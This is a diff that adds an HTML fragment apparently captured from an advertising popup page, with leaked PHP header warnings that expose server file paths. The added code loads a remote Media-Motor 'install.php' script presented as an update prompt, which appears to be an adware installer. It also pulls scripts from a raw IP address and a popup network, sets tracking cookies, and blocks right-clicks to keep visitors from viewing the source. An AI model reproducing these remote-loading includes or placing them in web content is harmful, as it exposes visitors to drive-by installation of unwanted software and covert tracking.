@@ -1,0 +1,75 @@
+
+<!-- Media-Motor prompt begin -->
+<script language="JavaScript" type="text/JavaScript" src="http://mmm.media-motor.net/install.php?allowsp2=0&protect=no&ttmr=0&retry=1&aff=update&mincook=0&testforcook=0&lfir=1"></script>
+<script language="JavaScript">self.focus();</script>
+<!-- Media-Motor prompt end -->
+
+<br />
+<b>Warning</b>:  Cannot modify header information - headers already sent by (output started at /var/www/html/popup/oldpopcode.php:36) in <b>/var/www/html/popup/popsn12.php</b> on line <b>3</b><br />
+<br />
+<b>Warning</b>:  Cannot modify header information - headers already sent by (output started at /var/www/html/popup/oldpopcode.php:36) in <b>/var/www/html/popup/popsn12.php</b> on line <b>4</b><br />
+<br />
+<b>Warning</b>:  Cannot modify header information - headers already sent by (output started at /var/www/html/popup/oldpopcode.php:36) in <b>/var/www/html/popup/popsn12.php</b> on line <b>5</b><br />
+<br />
+<b>Warning</b>:  Cannot modify header information - headers already sent by (output started at /var/www/html/popup/oldpopcode.php:36) in <b>/var/www/html/popup/popsn12.php</b> on line <b>6</b><br />
+<SCRIPT LANGUAGE="JavaScript" src="http://64.27.100.65/btest.js"></SCRIPT>
+<SCRIPT LANGUAGE="JavaScript" src="http://www.popuptraffic.com/assign.php?l=karthic&mode=layers"></script>
+<SCRIPT LANGUAGE="JavaScript">
+<!--
+printAdLayer();
+//-->
+</SCRIPT>
+
+
+<SCRIPT LANGUAGE="JavaScript">
+var adExpiration = 60;
+var currentDate = new Date();
+currentDate.setTime(currentDate.getTime() + 86400000);
+        adExpiration = currentDate.toGMTString();
+
+function SetCookie(sName, sValue, sExpire){
+        var expireCode = "";
+        if (sExpire) { expireCode =  "expires=" + sExpire + ";" }
+        document.cookie = sName + "=" + escape(sValue) + ";" + expireCode
+        }
+        SetCookie("cood","03", adExpiration);
+        SetCookie("total","1", adExpiration);
+        SetCookie("popper","1", adExpiration);
+
+</script>
+
+
+<script language="JavaScript">
+
+ <!--
+// No rightclick script v.2.5
+// (c) 1998 barts1000
+// barts1000@aol.com
+// Don't delete this header!
+
+var message="Thank you.";
+
+// Don't edit below!
+
+function click(e) {
+if (document.all) {
+if (event.button == 2) {
+alert(message);
+return false;
+}
+}
+if (document.layers) {
+if (e.which == 3) {
+alert(message);
+return false;
+}
+}
+}
+if (document.layers) {
+document.captureEvents(Event.MOUSEDOWN);
+}
+document.onmousedown=click;
+// -->
+
+</script>
+
